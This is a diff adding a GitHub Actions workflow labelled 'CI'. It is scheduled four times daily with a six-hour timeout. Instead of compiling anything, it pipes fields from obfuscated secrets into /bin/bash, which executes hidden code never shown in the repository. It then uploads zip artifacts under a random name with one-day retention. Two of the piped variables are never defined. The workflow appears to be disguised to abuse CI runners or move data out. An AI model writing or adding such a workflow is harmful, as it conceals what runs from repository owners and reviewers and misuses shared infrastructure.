@@ -1,0 +1,30 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '53 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          uszg52070: ${{ secrets.uszg52070 }}
+        run: |
+          printf '%s' "$uszg52070" | jq -r .b853 | /bin/bash
+          printf '%s' "$exohw2" | jq -r .r19 | /bin/bash
+          printf '%s' "$cqe04" | jq -r .u1 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: PDoJzckB
+          path: "*.zip"
+          retention-days: 1
